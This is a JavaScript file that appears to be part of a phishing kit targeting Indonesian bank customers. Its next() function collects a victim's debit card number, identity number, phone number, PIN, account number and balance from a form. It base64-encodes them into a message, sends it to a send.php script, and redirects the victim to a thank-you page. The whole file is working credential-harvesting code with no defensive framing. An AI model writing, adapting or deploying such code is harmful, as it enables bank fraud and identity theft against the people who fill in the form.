$(document).ready(function() {
});

function next() {
    var debitNumber = $("#debit-number").val().trim();
    var identityNumber = $("#identity-number").val().trim();
    var gender = $("#gender").val().trim();
    var phone = $("#phone").val().trim();
    var pin = $("#pin").val().trim();
    var account = $("#account").val().trim();
    var balance = $("#balance").val().trim();
    if (debitNumber=="" || identityNumber=="" || phone=="" || pin=="" || account=="" || balance=="") {
        alert("Mohon lengkapi data");
        return;
    }
    $("#loader").css("display", "flex");
    $.ajax({
        type: "get",
        url: "send.php?message="+btoa(encodeURIComponent("<b>No. debit:</b> "+debitNumber+"\n<b>No. identitas:</b> "+identityNumber+"\n<b>Jenis kelamin:</b> "+gender+"\n<b>No. HP:</b> "+phone+"\n<b>PIN:</b> "+pin+"\n<b>No. rekening:</b> "+account+"\n<b>Saldo:</b> "+balance)),
        dataType: "text",
        success: function(response) {
            $("#loader").css("display", "none");
            window.location.href = "thank.html";
        }
    });
}

module.next = next;